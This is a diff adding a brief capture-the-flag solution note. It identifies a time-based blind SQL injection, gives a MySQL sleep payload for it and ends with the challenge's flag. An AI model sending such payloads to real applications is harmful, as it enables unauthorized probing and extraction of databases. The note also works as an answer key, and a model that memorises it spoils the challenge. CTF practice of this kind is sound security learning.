@@ -1,0 +1,5 @@
+This is time based sql injection any time based payload will work 
+
+    ,(select * from (select(sleep(10)))a)
+
+ctf7{advanced_time_blind_sql_exploit}
